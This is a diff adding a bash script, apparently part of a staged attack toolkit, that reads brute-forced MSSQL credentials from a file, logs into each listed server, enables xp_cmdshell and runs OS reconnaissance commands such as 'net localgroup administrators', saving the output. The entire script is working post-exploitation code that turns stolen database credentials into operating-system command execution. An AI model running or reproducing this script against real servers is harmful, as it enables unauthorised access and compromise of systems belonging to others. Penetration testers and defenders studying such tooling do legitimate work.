@@ -1,0 +1,39 @@
+#!/usr/bin/env bash
+
+# Connects to MSSQL, enables xp_cmdshell, runs OS recon commands.
+
+OUTDIR="./recon"
+CREDS_FILE="$OUTDIR/hosts/mssql-creds.txt"
+MSSQL_DIR="$OUTDIR/mssql"
+mkdir -p "$MSSQL_DIR"
+
+if [[ ! -f "$CREDS_FILE" ]]; then
+    echo "[-] $CREDS_FILE not found. Run 02_bruteforce first."
+    exit 1
+fi
+
+echo "[*] Starting MSSQL exploitation phase"
+
+while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
+    [[ -z "$USER" || -z "$PASS" ]] && continue
+
+    echo ""
+    echo "[*] Target: $TARGET_IP:$TARGET_PORT  |  User: $USER"
+
+    SAFE_TARGET="${TARGET_IP//./_}"
+    OUT_FILE="$MSSQL_DIR/${SAFE_TARGET}_${TARGET_PORT}_cmdshell.txt"
+
+    # Enable xp_cmdshell and run recon commands in a single mssqlclient session
+    printf "sp_configure 'show advanced options', '1';
+RECONFIGURE;
+sp_configure 'xp_cmdshell', '1';
+RECONFIGURE;
+exec master..xp_cmdshell 'hostname';
+exec master..xp_cmdshell 'ipconfig /all';
+exec master..xp_cmdshell 'net localgroup administrators';
+exit
+" | mssqlclient "${USER}:${PASS}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1 | tee "$OUT_FILE"
+
+    echo "[+] Output saved to $OUT_FILE"
+
+done < "$CREDS_FILE"
